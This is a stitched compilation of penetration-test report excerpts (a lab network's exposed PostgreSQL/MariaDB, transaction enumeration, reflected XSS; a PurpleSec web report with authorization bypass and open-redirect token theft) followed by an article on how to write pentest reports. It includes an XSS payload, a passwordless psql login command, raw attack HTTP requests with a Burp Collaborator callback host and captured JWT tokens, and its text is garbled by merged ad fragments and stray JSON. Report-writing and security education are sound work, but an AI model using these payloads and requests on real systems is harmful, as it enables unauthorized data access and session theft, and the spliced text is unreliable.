As a result, attackers can access all databases on charley and enumerate data found. The postgres user has full control over the database within the host. Figure 3: User postgres does not require a password to authenticate. Potential Business Impact: The data stored within this database contained unencrypted database information which is a direction violation of PCI DSS more information information can be found in Section 2.3.1. Failures of PCI DSS can result in fines and other punishments. Each security incidents and breaches can result of a $500,000 fine [8]. Figure 4 shows that credit card information was stored encrypted. Affected Host: Eggdicator (10.0.17.10) Scrumdiddlyumptious (10.0.17.12) Charley (10.0.17.14) Exploitation Details: A user who can connect to 10.0.17.14 can connect to the postgresql server by running the following command: psql −U postgres −p 5432 −h 10.0.17.14 Recommended Remediation: Page 10\\nFigure 4: PostgreSQL Billing Table stored in the clear. Harden the PostgreSQL server to require password authentication. Additionally, having firewall access controls to restrict what respective IP addresses can access the database would provide an additional layer of security. ALTER USER postgres PASSWORD ‘B3tt3rP@ssw0rd ’ ; Additionally, the PostgreSQL instance could be further hardened by making rules in the pg_hba.conf file to only allow for authentication from certain hosts. More information about this configuration file can be found in the references for this section. References: https://www.postgresql.org/docs/13/auth-password.html https://www.postgresql.org/docs/9.2/auth-pg-hba-conf.html Page 11\\n4.2 High Risk 4.2.1 Lack of MariaDB Authentication Threat Level: High (7.5) Description: UnauthenticatedaccesstoaMySQLdatabasepermitsaccess/modificationtosensitivedatasets, including the following: • Customer Accounts and passwords (Base64 encoded). • Customer PII - includes phone numbers, address, and payments (including amounts). • Invoices and payments. • Creation of administrator accounts for AEC’s croissant marketplace. • Insertion, deletion, and modification of all data within the database. Figure 5: Passwordless Root MariaDB Access Potential Business Impact: This host (Charley) can severely impact the Confidentiality, Integrity, and Availability (CIA) of transactions within the warehouse management systems. Improper encoding schemes result in an environment in which all of the AEC store website (Scrumdiddlyumptious) users’ passwords can be decoded from base64. All accounts can also be modified to granted administrator level access on the AEC store.

Affected Hosts: Charley (10.0.17.14) Scrumdiddlyumptious (10.0.17.12) Whatchamacallit (10.0.17.13) Exploitation Details: New Haven Hacking Inc. used the MySQL command line application to query the unau- thenticated database as the root user. All customer information could be obtained without modifying the database schema or contents. This user also had write permissions, meaning a malicious actor could arbitrarily modify database contents. Figure 6 shows the connection from the PostgreSQL server and initial shell commands. Figure 6: MariaDB tokens Table Dump Recommended Remediation: A minimal number of hosts should be able to interact on the network with the MySQL database. By limiting network access to only those required hosts, potential attacks against the MySQL service are minimized. The following iptables commands can be used to enable access controls and limit which hosts can reach MySQL: iptables −A INPUT −p tcp −−dport 3306 −s <IP> −j ACCEPT iptables −A INPUT −p tcp −−dport 8000 −j DROP If a firewall is not an option due to constraints within the environment (we recommend using a firewall), another option is to use ACLs within MySQL. This can be done by altering Page 13\\nusers to only be accessible via certain IPs or domains. This can be done using the following commands: CREATE USER ‘user ’@‘ localhost ’ IDENTIFIED BY ‘password ’ ; CREATE USER ‘user ’@‘10.0.17.13 ’ IDENTIFIED BY ‘password ’ ; References: https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/general-security-iss ues.html https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/access-control.htm l https://www.digitalocean.com/community/tutorials/iptables-essentials-common- firewall-rules-and-commands Page 14\\n4.3 Moderate Risk 4.3.1 Payment Transaction Enumeration Threat Level: Moderate (4.5) Description: The Jawbreaker portal on the eggdicator host allows users to enter transaction IDs and returnstransactioninformationincludingtheamount,customer_id,andstatus. Allcustomer transactions can be enumerated without any authentication (see Figure 7). Figure 7: Powershell Script to pull all Customer transactions. Potential Business Impact: Potential attackers could extract all transactions regarding the revenue of AEC. Although thesestransactionsonlyrefertothecustomerasaUUID,thevalueisuniquetothatcustomer and could be used to associate multiple transactions to specific purchasers. Page 15\\nAffected Hosts: Eggdicator (10.0.17.10) Exploitation Details: Thepowershellscriptshownabovecanbeusedbynavigatingtohttps://10.0.17.10/payment/$i and replacing “$i” with a numeric value. This would return JSON data regarding a trans- action if one exists with the given ID. Based on results obtained from the script, a total of 6469 transactions were present and extractable. Recommended Remediation: Using a UUID instead of an id for each transaction would mitigate sequential enumeration and would greatly increase the time needed for a brute force attack. Additionally, rate limiting hosts to only a specific number of requests per minute (more information can be found in references) would further mitigate the attack. Moreover, implementing authentica- tion on the API would limit enumeration to only authorized users. Access tokens or basic http authentication are both options which would help reduce the risk introduced by this vulnerability.

A mali- cious actor could supply malicious Javascript to redirect users and steal cookies. Figure 8: XSS Vulnerability in username input field Potential Business Impact: Because this vulnerability uses reflected XSS instead of stored XSS, phishing would most likely be required for a successful exploit. However, an employee of AECfalling for a phish- ing campaign could lead to drive-by downloads and cookie theft, resulting in the potential compromise of machines on the network. Affected Host: Crunch (10.0.17.50) Crunchserial (10.0.17.51) Exploitation Details: Results can be reproduced by navigating to http://10.0.17.50:9090/ScadaBR/ (without hav- ing been authenticated beforehand) and typing the following in the username field: admin\"><script>alert (\"XSS\")</script> This will result in a reflected cross-site vulnerability displaying an alert on the page with the text “XSS”. While the alert text is only an example, a threat actor could include arbitrary JavaScript in the payload. Recommended Remediation: Validate & sanitize all form fields to prevent XSS attacks. Use a Web application firewall (WAF) to block the execution of malicious scripts. Additionally, convert all alphanumeric Page 17\\ncharacters to HTML character entities before displaying user input. To ensure that cookies cannot be stolen, it is recommended to include in the headers “Secure” and “HttpOnly” so that cookies are not accessible to unintended parties and are sent over HTTPS. At the moment, the web traffic on the ScadaBR server is not encrypted. The Secure header can only be implemented once TLS is implemented and enabled on the host.

Potential Business Impact: This could save potential incidents of breach as by enabling firewallswithstrongrulescouldthwartattackersfromgainingunauthorizedaccesstosystems that potentially contain security vulnerabilities such as remote code execution. Recommended Remediation: On hosts setup up proper firewalls using iptables, ufw, or other software. Examples of these can be found in Section 4.2.1. PCI DSS requires firewall zone-based controls between trusted and untrusted zones. Some best practices for firewalls are to: • Block traffic by default • Set Explicit Firewall Rules First • Establish firewall configuration change plan • Optimize firewall rules • Update Firewall Software Regularly Additionally, it may also be beneficial for AEC to implement intrusion-detection and/or intrusion-prevention systems on the network to help with detecting and preventing future exploitation of the network.

The intent of an application assessment is to dynamically identify and assess the impact of potential security vulnerabilities within the application. During this assessment, both manual and automated testing tools and techniques were employed to discover and exploit possible vulnerabilities. All testing activities were conducted against the {URL} development environment to limit the impact of any service disruptions. Assessment of the {URL} application began on {Begin.Date} and concluded on {End.Date}. Testing was conducted from both an unauthenticated and authenticated context. Unauthenticated testing examines the exterior security posture of an application and looks for vulnerabilities that do not require authentication to exploit, while authenticated tests focus on discovering and exploiting vulnerabilities on portions of the internal application that are only accessible after successful authentication. Assessors were provided both a regular user and an administrative user account to assess the internal security controls of the application. PurpleSec assessors were able to identify and exploit instances of the following vulnerabilities: Vulnerability Severity Cross-Site Scripting (Stored) High Authorization Restriction Bypass High Open-Redirect High Low Severity 1 Low Low Severity 2 Low The Stored Cross-Site Scripting vulnerability had four separate instances. Each of these instances could be leveraged by an attacker to perform unauthorized actions on behalf of the victim, conduct phishing attacks, or force the download of malicious software.\\nThe Authorization Restriction Bypass vulnerability had two separate instances; both would allow an attacker to obtain sensitive information on application users and their data. This unauthorized information disclosure could be leveraged to aid other attacks and cause reputational harm. The last high-severity finding discovered was an Open-Redirect vulnerability. This vulnerability could allow an attacker to steal session cookies, which in turn would allow an attacker to perform actions within the application as the victim user. Finally, two low-severity findings were also identified during testing. While these vulnerabilities pose no immediate threat to the application or its users, remediating them would further strengthen the application's overall security posture. A detailed explanation of the above vulnerabilities can be found in Appendix A – Findings.\\nAttack Narrative Stored Cross-Site Scripting Severity: High Cross-Site Scripting (XSS) is a client-side code injection attack.

Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the user's limits. Instance 1 It is possible to bypass application GUI authorization restrictions and arbitrarily create teams that belong to other application users. The assessor@purplesec.us user makes the following HTTP request. The HTTP request modifies the \"ownerId\" parameter from 3401 to 3402. This modification will arbitrarily assign the team to the dev+assessor_purplesec.us@the company user without their consent. Moreover, the request also adds the assessor@purplesec.us user as one of this new team's members: POST /ajax/team/create HTTP/2 Host: {URL} Cookie: <snip> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@kd126yz624yclvld46y7azdqmhs8m2pqe.burpcollaborator.net Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate name=NOTREAL&isPublic=true&members%5B0%5D=assessor%40purplesec.us&ownerId=3402\\nDate: Wed, 28 Jul 2021 22:33:09 GMT Content-Type: application/json; charset=utf-8 Content-Length: 35 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin,Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment;",

Instance 2 It is possible to retrieve other users' project takeaway information. Changing the \"projectId\" parameter in the following HTTP request will reveal project information associated with that \"projectId.\" This is despite the user having no access to that project. The assessor@purplesec.us user has no authorization to view project information associated with the projectId 32489.

An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. Session Hijacking Using an open-redirect vulnerability, it is possible to steal the application user's sensitive cookie. Specifically, the access_token and id_token cookies. These two cookies will allow an attacker to interact with the application's GraphQL scheme as the victim. The following HTTP request was observed while interacting with the application: GET /auth/authorize?displayType=general&redirect_uri=https%3A%2F%2F{URL}%2Fquote%2FloginCallback% 3Fstep%3D%26autosave%3Dno%26exit%3Dno%26project%3D%26delegate%3Ddashboard HTTP/2 Host: {URL} Cookie: ajs_anonymous_id=c18977c2-e232-45f0-8b50-413c89650e2b; intercom-id-mgfmc61p=f6ae4012- b890-42a6-a7e9-f2b3c0c40334; intercom-session-mgfmc61p=; ajs_user_id=3410; dio=588a409f6514b4ba55471483afe819d1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close\\nHTTP/2 302 Found Date: Wed, 28 Jul 2021 23:29:42 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location:https://{URL}/quote/loginCallback?step=&autosave=no&exit=no&project=&delegate=dashboard&a ccess_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON- PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU&id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI 6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZ GlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQiOiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTY yNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlbWFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVy aWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0dGVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0d GVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3QiLCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86c m9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNhq7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFS NMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsBZ8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAo xnEwwkewH6t7nCKAL2l8&code=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU 2ZDZiNzE1MTQxMTU1MWEzMDQ2MTNhIn0.eyJleHAiOjE2Mjc1MTY3ODIsIm5vbmNlIjoiMmVmYjc5MGMt NWEyNS00NDI1LWFkMDgtMGIwMjYxNmJkODcxIn0.Wwq8nWDgwk1o23GmIZN4bZGyEF- YPwbLpwzNkj4STDD8SovZ1FWuoWntjOBs8vKwzZ4sU8wWv1uXn- C2brQMzehJRgl3nGbSZQt0HFiWiOYNe3LShw9DWLW2GI4f96T9jPCHqKgkP7BvT7ReFmAiW5twghfCKx UJzGwpbSu9YME\\nSet-Cookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTE2NzgyLCJpYXQiOjE2Mjc1MTQ5ODJ9.g_-B3k44G- _SlZ8zKb5KwZtt_41OCGIJ51iy4- QbLrptfBKSKXj9RjUopOac_4VhHmGP4Wel4FSLN8NGqk2SPgEMHR_UdwUyIWXDzr0ONBBR9- WcHue9z1Dt8mAcmIIruwJVnON-PuZRJPeOfxkirIJK3Fbu4XX2AfOG3u6XXEU; expires=Wed, 28-Jul-2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax Set-Cookie: id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1 MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDEiLCJhdWQi OiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUxNjc4MiwiaWF0IjoxNjI3NTE0OTgyLCJlb WFpbCI6Im1hcmNAcHVycGxlc2VjLnVzIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJUZXN0d GVzdHR0dCB0cmVzdCIsImdpdmVuX25hbWUiOiJUZXN0dGVzdHR0dCIsImZhbWlseV9uYW1lIjoidHJlc3Qi LCJ6b25laW5mbyI6IkFmcmljYVwvQWNjcmEiLCJkaW86cm9sZXMiOltdfQ.1huEcioFrbx5yQGOKnaBStqNh q7u72zD5ZWgRWkuj2Qg4oZYKVut51M0pk2sOe0YHyFSNMdj6w_bJy5NnphEHB7RfKlUHhy3FhsEni6HsB Z8RxIa63JVKZbGwoc7YtVNEhHd1rRZQv0fh3MFgv3YiAoxnEwwkewH6t7nCKAL2l8; expires=Wed, 28-Jul- 2021 23:59:42 GMT; Max-Age=1800; path=/; SameSite=Lax The application sets both the access_token and id_token cookies then redirects the user to URL including both cookies as parameters.

Consequences of this vulnerability include sensitive account hijacking, stolen credentials, and sensitive data could be exfiltrated. Recommendations: Cross-site scripting vulnerabilities can be remediated by implemented two countermeasures – input validation and output encoding. These controls restrict impact by sanitizing the user's input to remove special characters and then encoding any remaining special characters before returning the content to the user. ● Input Validation: It is recommended that the user's input is sanitized by removing special characters <,>,',\",&,/ and JavaScript onEvent actions. ● Output Encoding: If special characters are required in the affected parameters, output encoding should be used to replace special characters with their HTML equivalent. (e.g., < becomes <) URL Locations: Instance 1 ● Redacted Instance 2 ● Redacted Instance 3 ● Redacted Instance 4 ● Redacted Additional Resources: ● OWASP Cross-site Scripting\\n2. Authorization Restriction Bypass An attacker can use these instances of broken access controls to discover sensitive application user information and data. This information can be used to further other types of attacks such as phishing, steal user data and cause reputational harm. Recommendations: Enforce authorization controls at a granular level.

A pentest report should also outline the vulnerability scans and simulated cybersecurity attacks the pentester used to probe for weaknesses in an organization’s overall security stack or specific systems, such as websites, applications, networks, and cloud infrastructure. To be truly useful, the report must be more than a simple list. Penetration test reports deliver the only tangible evidence of the pentest process and must deliver value for a broad range of readers and purposes. We explore the art of writing effective penetration testing reports in the sections below: How to Write a Great Pentest Report in 6 Steps The process of writing a great penetration test report is straightforward and can be covered in six key steps. Each step builds on the previous step to increase the quality of the information, the organization of the findings, and the usability of the report for stakeholders. × FlexJobs 1. Plan: Outlinin M g th a e k te e st in $ g 2 an 5 d / c H rea r t in O g r r e p M ort o te r m e p la F te r s o in m adv H anc o e m act e s both as a checLkEliAstR oNf i nMfoOrmRaEtion needed and as a repository for testing details.\\n2. Capture the technical details: Include notes, screenshots, and log files in the report, but to make documentation less disruptive, take video and narrate while conducting the pentest and take screenshots later. 3. Start with a rough draft: Begin with the most significant vulnerabilities, remediations, and overall results. Don’t worry about grammar, spelling, or complete sentences just yet. 4. Categorize and summarize key findings: Including criticality, vulnerability, system, and other important findings will help clients address issues by the level of risk they pose. 5. Revise the draft: Here’s where you focus on grammar, punctuation, and spelling to turn the content into plain, formal English, using non-technical language to help IT generalists and managers understand the risks. 6. Organize and proofread: Double check the information to eliminate errors, make the report easy to read, and to focus on the most important findings; move non-critical information to appendices. Although the process is simple enough, a quality report relies on the proper execution of this process and the inclusion of expected information.

Also read: 7 Types of Penetration Testing: Guide to Pentest Methods & Types Penetration Testing Phases & Steps Explained 8 Common Sections to Include in a Pentest Report Every penetration test will be unique because each organization’s IT infrastructure, security stack, application code, website APIs, and vulnerabilities will be a unique combination. However, the usability of the report depends on a writer’s ability to take the unique information and organize it into an expected format clearly and concisely. Some components of a pen test will be mandatory and must be present to provide value. Other components are nice to have because they help to improve the value of the report to stakeholders. The table below lists key information on eight common sections found in a typical pentest report, which we’ll go into in more detail below. Must / Nice to Order in the Order in the Level of Technical Section Level of Detail Have Report Drafting Info Executive Must Have 1 5 Low Low Summary Key Findings Must Have 2 4 High High Engagement Must Have 3 1 Low Low Summary Full Pen Test Must Have 4 2 Medium Medium Results Ratings & Risk Nice to Have 5 (appendix) Pre-draft n/a n/a Score Vulnerability Nice to Have 6 (appendix) Pre-draft Medium High Details Full Testing Nice to Have 7 (appendix) 3 High High Procedure Acronym Nice to Have 8 (appendix) Pre-draft n/a n/a Appendix Executive Summary Unless an organization is extremely technical and focused on security, the executives of the company that make resource allocation decisions will generally not understand most of the key findings of a pentest report. They may know they have a network, but not und×erstand how firewall rules protect that network. An executive summary must be simple, written in non-technical English, and to the point. The pentest writer must outline the key findings and high-level recommendations based on urgency and risk in a clear manner. https://www.esecurityplanet.com/networks/pentest-report/ 2/11\\nThe executive summary contains similar sections as the rest of the report, but in summary form: key findings, engagement summary, and overall penetration test results. Where possible, tables, charts, and graphics should be used to help quickly convey the findings by severity rating, items to address immediately, etc. The executive summary will generally be placed first in the pen test report, but written last once all of the other findings have been compiled and drafted. This is perhaps the most critical section of the report since the non-technical executives will likely determine future budgets for vulnerability correction and pentesting needs. Key Findings As this is the most important section for the technical team, it is placed as the second major section of the report. For every unique vulnerability identified, the pen test report writer will create a vulnerability report. All major vulnerabilities will be listed and detailed within the key findings section, with backup information that explains: Vulnerability name, standardized if possible Location of the vulnerability (list of systems, apps, etc.) Technique used to find the vulnerability Proof of",

This section should contain only the high-risk vulnerabilities that need to be addressed. Low-risk vulnerabilities can be listed in a table or graph in this section but details on less important vulnerabilities should be left for the Penetration Test Results section. For clients that do not wish to use the penetration testing team for remediation, a high-level list of potential remediations should be used that explains possible solutions. A short recommendation such as “upgrade to version 10.x” will often be sufficient, but should also consider the context of the business environment. For example, a Windows XP machine maintained to run critical industrial equipment will be highly vulnerable and easily exploited. However, a recommendation to simply replace the old computer with a Windows 11 machine will be useless to the client that can only use Windows XP with that equipment. If the client has contracted for remediation or if this is an internal penetration testing report, recommendations may need to be quite involved and include prices for various options, timelines, and labor requirements. In some cases this might merit a separate Remediation Section. Engagement Summary The Engagement Summary can be the first section written because it comes from the statement of work. This section provides the context for the full penetration test results to follow and should outline both the original terms of engagement as well as any added requirements or limitations introduced in the course of the testing. This section should include: The scope of the testing, including IP addresses, systems, applications, exclusions, etc. The timeline, including dates of testing and times (if limited) for testing specific resources (example: only test the web application between 10pm and 11pm weekdays) Security defenses tested Assumptions Standards applied to testing, such as PTES standard for networks, OWASP for applications Compliance standards considered in the testing Full Pen Test Results The Full Pen Test Results section includes all details for all testing performed.

Instead of focusing on vulnerabilities, this section will focus on a system-by-system and test-by-test review of the penetration testing process. × This section will discuss all attack methods attempted, including those that did not succeed. This expanded information will help reinforce the value of the parts of the security stack that performed well. https://www.esecurityplanet.com/networks/pentest-report/ 3/11\\nThis section can be very long as it will contain many details. It will typically be written as a draft or as notes early in the process and pen testers can put raw notes and screenshots here initially. If the section seems too long, some repetitive information for non-critical vulnerabilities can be moved to the appendix. For example, if a test was performed on all 1,500 endpoints in an organization and was blocked by the local firewall, it would be better to give this test a name and show that the endpoints passed the test. The details of how this test was performed can be moved to the Full Testing Procedure Details Appendix. Ratings & Risk Score Appendix When assigning priority to vulnerabilities, most penetration testing companies use a standardized method and score to determine a rating or risk score (numeric or qualitative). This section in the appendix should explain the system for the client and will usually be written in advance as a standardized section of all pen test reports. Vulnerability Details Appendix For each vulnerability found, the vulnerability can be explained in detail in this appendix. For example, most non-technical readers will not need to know the details of a cross-site scripting (XSS) vulnerability and many technical teams already know what they are. A full explanation may not be needed and therefore not included in the main sections of the pentest. However, some might find more details helpful and thus an appendix can be considered. Since many vulnerabilities are standardized, this section can also be prepared in advance for the most common vulnerabilities expected in the pentest. Full Testing Procedure Details Appendix As noted above, some testing will be repetitive and if they do not result in any discovered vulnerabilities the tests may not be interesting. However, some technical teams and some compliance auditors will want to see the methodology performed for each test and would appreciate a detailed appendix section. Acronym Appendix Security and IT use an enormous number of acronyms for technologies, vulnerabilities, protocols, etc. This appendix should explain each acronym used in the report to help eliminate any confusion and misunderstanding. For electronic copies, the acronyms used elsewhere in the report could use internal document links directly to this appendix. 3 Factors For Effective Penetration Test Reports For a pentest report to be effective, the results must be useful and provide value to all levels of readers, from executives to hands-on technicians.

Pentest report writers must keep these three factors in mind: Penetration test objectives that will vary at different levels of the organization Useful pentest results must be provided to extract value Tips and cautions to maximize the value of the report Penetration Test Objectives When authorizing a penetration test, an organization seeks to test their existing security controls for the systems authorized for testing. To deliver value on this investment, the penetration test writer must display the professionalism and competence of the testers clearly, both through the results of the test and the effective communication of the results. The penetration test report content must reflect the objectives of a diverse set of stakeholders: Executives and board members will want to see value for their investment and need a clear and understandable non-technical summary Technical teams will want clear, detailed, and actionable information that can be used to remedy discovered vulnerabilities Compliance and legal teams will need penetration test results that clearly show how the organization satisfies their compliance obligations Penetration testers, of course, want to demonstrate the quality of their skills and the satisfaction of the objectives of the testing × process Useful Pentest Results https://www.esecurityplanet.com/networks/pentest-report/ 4/11\\nPenetration test results will be used to determine resource allocations, remediation requirements, justify the acquisition of new cybersecurity tools, and determine the urgency of corrective action. Usable reports enable these goals efficiently and effectively. The key factors for usability are: clear presentation, client customization, and standardized ratings. Clear Presentation The pen test report writer must consider how to clearly present: Importance of Key Findings Overall findings Recommended Remediations Technical details Tested systems and methods used Often tables and graphics help for easy digestion of information and should be used frequently. Similarly, a pen test report should be written as clearly and concisely as possible for clear and quick understanding. Client Customization Although key findings will typically be listed by severity and overall findings will tend to be listed by system, a pen test report should be customized to the needs of the client. For example, in a large enterprise, there may be separate groups responsible for networks and for application development. This type of organization will likely want reports with completely segregated key findings and overall results organized by team responsibility. Standardized Ratings A simple good / bad rating will not convey enough information, but will be equally as useful as an overly complex matrix of, say, three categories of eight possible ratings levels. To be most usable, ratings need to mirror ratings systems familiar to the technical teams. The Common Weakness Enumeration (CWE) list developed by MITRE or scores based on the Common Vulnerability Scoring System (CVSS) will be familiar to all technical staff and are not too",

The Common Weakness Enumeration (CWE) list developed by MITRE or scores based on the Common Vulnerability Scoring System (CVSS) will be familiar to all technical staff and are not too difficult to explain to executives. While these scores will lack the context of the business or active exploitation efforts, using standardized ratings as an initial base will typically be appreciated and easily understood. Tips and Cautions The main purpose of pentesting is to locate and remediate vulnerabilities before an attacker can exploit them. However, there are adjacent issues related to compliance and confidentiality that need to be considered for testing and reporting. Compliance Penetration Tests Generic pentests can check for vulnerabilities, but not necessarily touch on all elements to verify compliance. Some compliance standards require specific tests on specific systems and penetration testers should be told of such requirements in advance. Likewise the pen test report should reflect any compliance needs and specifically demonstrate the pen test results against specific compliance standards, either as the core of the penetration test results or within related appendices. The report should specifically demonstrate that the security for systems or processes protecting regulated data have been tested as required and the results of those required tests. Penetration Test Confidentiality Confidentiality is key to security. Yet a thorough penetration test result will include many confidential details (IP addresses, security tool settings, application code, etc.) that would seriously harm an organization if exposed. Confer with the client to determine the distribution needs for the report. If necessary, offer an edited or redacted version of the report that removes confidential information for broader distribution to non-privileged stakeholders (customers, vendors, affected executives, etc.). The client should also be consulted to determine the need for compliance-specific reports that contain only the pen test results for systems and assets touching the regulated data. If delivering reports electronically, consider encrypted or technologically restricted distribution (specific-user only permissions, etc.). Physical reports should be numbered and tracked. Pentest Report Checklist × The preparation of a penetration test report can be stressful and it will be easy to miss critical steps in the stress of writing and the technical details.

Fortunately, many penetration testing reports have been made public and can be found in a variety of resources. Two key repositories with hundreds of reports can be found at Pentest Reports and the public-pentesting-reports GitHub repository for JulioCesarFort. Most published reports focus on application security testing which can be published for open source projects or older applications without disclosing dangerous secrets. Penetration tests for network security require redaction or changing the information to hide IP addresses and security measures that likely continue to remain in place. × Of course, with hundreds of reports, it can be overwhelming to figure out where to start. Below, we list five key report types and aspects to examine for each: https://www.esecurityplanet.com/networks/pentest-report/ 6/11\\nApplication Code Audit: Kudelski Security code review provides an effective Issue Summary List and supporting technical details section. External IP Address Penetration Report: 7ASecurity pentest on an minivpn implementation provides quality findings and recommendations, but lacks a useful executive summary to determine the results at a glance. Internal Network Pentest: Rhino Security network assessment using open source nmap and nessus tools includes an attack narrative to help convey the significance and potential business impact of server message block (SMB) protocol issues. Industrial Control System Network: Redacted pentest on Next Generation Power, Electric, and Water on an ICS subnet demonstrates a good use of graphics and formatting to aid in communication. Social Engineering or Phishing Test Report: The Volkis phishing campaign report provides good process details, but lacks graphical representation of the findings to reinforce easy understanding of the executive summary.

    "text": "and External Penetration Test Reports? The biggest differences between internal and external penetration testing reports will typically be the formality. Internal penetration testing will often be conducted by employees of an organization and external pen testing will be conducted by third parties contracted for the work. Third parties need to demonstrate more value and will often have more polished reports to demonstrate value. However, internal reports still need to accomplish all of the same goals and contain useful information for all readers so the key sections (executive summary, key findings, engagement summary, full pen test results) need to be present and the report must also be usable. What is the Difference Between Application, Website, Infrastructure, and Physical Penetration Test Reports? There is no real difference between different types of penetration test reports even for different penetration testing methods and the type of assets tested. The evidence and technical details for findings will be completely different, but the method, common sections, elements, and factors for success for different types of penetration test reports will be the same. Bottom Line: Reports Are the Final Pentesting Product Penetration testing plays an increasingly important role in assessing the health of security systems protecting organizations of all sizes. However, without an effective penetration test report, the investment in time and resources may be wasted, even with a quality penetration test assessment. Penetration testers must master the art of clearly presenting their results if they want their hard work to be appreciated.
